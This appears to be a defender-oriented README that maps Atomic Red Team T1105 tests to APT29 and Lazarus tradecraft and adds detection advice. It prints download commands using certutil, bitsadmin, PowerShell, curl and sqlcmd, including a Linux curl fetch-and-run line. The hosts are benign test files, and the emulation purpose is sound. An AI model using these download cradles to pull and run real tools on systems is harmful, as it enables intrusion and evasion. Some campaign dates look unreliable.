# Atomic Red Team Tests for APT29 and Lazarus Group - T1105 Ingress Tool Transfer

This repository documents selected **Atomic Red Team tests for T1105 (Ingress Tool Transfer)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.

The goal is to:
* Provide defenders with a curated set of relevant tests for detecting tool transfer activities
* Map each test to known adversary behaviors and campaigns
* Highlight overlap and differences between the groups' file transfer techniques

---

## Background

* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
  * Known for the **SolarWinds compromise** and sophisticated cyber espionage
  * Frequently uses **living-off-the-land techniques** with legitimate system utilities
  * Employs **certutil, BITSAdmin, PowerShell, and SQLCMD** for tool transfers

* **Lazarus Group** is a North Korean state-sponsored threat group
  * Known for **Operation Dream Job** and large-scale cyber-espionage/financial theft
  * Uses **multiple download methods** including BITSAdmin, PowerShell, and curl
  * Targets both **Windows and Linux** environments

Both groups leverage T1105 (Ingress Tool Transfer) because it allows them to:
* Bring additional tools into compromised environments
* Use legitimate system utilities to evade detection
* Stage payloads for lateral movement and persistence

---

## Selected Atomic Tests for T1105

| Test # | Technique | Description | Used By |
|--------|-----------|-------------|---------|
| **7** | certutil download (urlcache) | Uses certutil with -urlcache to download files | **APT29** |
| **9** | Windows - BITSAdmin BITS Download | Uses BITSAdmin to schedule file downloads | **APT29 & Lazarus** |
| **10** | Windows - PowerShell Download | Uses .NET WebClient to download files | **APT29 & Lazarus** |
| **15** | File Download via PowerShell | Uses DownloadString with Out-File for downloads | **APT29 & Lazarus** |
| **18** | Curl Download File | Uses curl.exe to download files on Windows | **Lazarus** |
| **27** | Linux Download File and Run | Uses curl to download and execute on Linux | **Lazarus** |
| **29** | iwr or Invoke Web-Request download | Uses Invoke-WebRequest for downloads | **APT29** |
| **32** | File Download with Sqlcmd.exe | Uses sqlcmd to download files | **APT29** |

---

## Detailed Test Analysis

### Atomic Test #7 - certutil download (urlcache)
**Technique:** Living-off-the-Land Binary (LOLBin) Abuse  
**Adversary Usage:** APT29  
**Command:**
```cmd
certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
```
**Explanation:** APT29 has extensively used certutil for downloading additional tools and payloads during operations. This technique allows them to use a legitimate Windows component for malicious purposes, often evading detection.

### Atomic Test #9 - Windows - BITSAdmin BITS Download
**Technique:** Background Intelligent Transfer Service Abuse  
**Adversary Usage:** APT29 & Lazarus  
**Command:**
```cmd
bitsadmin /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt
```
**Explanation:** Both groups use BITSAdmin for stealthy file transfers. BITS allows background downloads with resume capability and is often trusted by security tools, making it ideal for persistent operations.

### Atomic Test #10 - Windows - PowerShell Download
**Technique:** PowerShell Download Cradle  
**Adversary Usage:** APT29 & Lazarus  
**Command:**
```powershell
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "$env:TEMP\Atomic-license.txt")
```
**Explanation:** This is a common technique used by both groups for downloading payloads. APT29 used similar methods during the SolarWinds campaign to download additional tools like TEARDROP and Cobalt Strike.

### Atomic Test #15 - File Download via PowerShell
**Technique:** PowerShell Download String  
**Adversary Usage:** APT29 & Lazarus  
**Command:**
```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt
```
**Explanation:** Both groups use this method for downloading and writing files. Lazarus has used similar techniques in Operation Dream Job to download multistage malware components.

### Atomic Test #18 - Curl Download File
**Technique:** curl Utility Abuse  
**Adversary Usage:** Lazarus  
**Command:**
```cmd
curl -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll
```
**Explanation:** Lazarus Group frequently uses curl for downloading tools on Windows systems, often targeting multiple directories to avoid detection.

### Atomic Test #27 - Linux Download File and Run
**Technique:** Linux Tool Transfer  
**Adversary Usage:** Lazarus  
**Command:**
```sh
curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh
```
**Explanation:** Lazarus targets Linux environments and uses curl to download and immediately execute payloads, demonstrating their cross-platform capabilities.

### Atomic Test #29 - iwr or Invoke Web-Request download
**Technique:** PowerShell Invoke-WebRequest  
**Adversary Usage:** APT29  
**Command:**
```cmd
powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
```
**Explanation:** APT29 uses Invoke-WebRequest (iwr) as an alternative download method, particularly in environments where other techniques might be blocked or monitored.

### Atomic Test #32 - File Download with Sqlcmd.exe
**Technique:** SQL Server Tool Abuse  
**Adversary Usage:** APT29  
**Command:**
```powershell
sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip
```
**Explanation:** APT29 has abused SQLCMD for file downloads, demonstrating their sophisticated tradecraft in using unexpected legitimate tools for malicious purposes.

---

## Correlation with APT29 & Lazarus

* **APT29 Focus:**
  * Living-off-the-land techniques (#7, #9, #32)
  * Multiple PowerShell variants (#10, #15, #29)
  → Used for stealthy tool transfer during espionage operations

* **Lazarus Group Focus:**
  * BITSAdmin for persistence (#9)
  * PowerShell download cradles (#10, #15)
  * Cross-platform tools (#18, #27)
  → Used for initial payload delivery and lateral movement

* **Overlap:**
  * Both groups use **BITSAdmin (#9)** and **PowerShell (#10, #15)**
  * Both employ **multiple redundant methods** for tool transfer
  * Both leverage **legitimate system utilities** to evade detection

---

## Defender Notes

* These tests are high-value because they **closely emulate real-world adversary tradecraft**
* Detection should focus on:
  * certutil with network-related parameters (#7)
  * BITSAdmin transfer commands outside normal administrative use (#9)
  * PowerShell download cradles with external URLs (#10, #15)
  * curl and sqlcmd making external network connections (#18, #27, #32)
* Correlation across events is essential:
  * Process creation + network connections to external domains
  * Unusual parent-child process relationships
  * Multiple download methods from the same host
* Implement application whitelisting to restrict unnecessary utilities
* Monitor for outbound connections to unfamiliar domains from trusted processes

## Campaign References

1. **APT29 SolarWinds Campaign** (2020): Used certutil, PowerShell, and BITSAdmin for tool transfer
2. **Lazarus Operation Dream Job** (2016-2017): Used BITSAdmin and PowerShell for malware downloads
3. **APT29 COVID-19 Vaccine Targeting** (2020): Used multiple download methods for tooling
4. **Lazarus Linux Targeting** (2018-2021): Used curl and wget on Linux systems

## Academic References

1. MITRE ATT&CK Technique T1105 - Ingress Tool Transfer
2. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (2017-2021)
4. CrowdStrike: "APT29 Targets COVID-19 Vaccine Development" (2020)
5. FireEye: "APT29 Domain Fronting With TOR" (2017)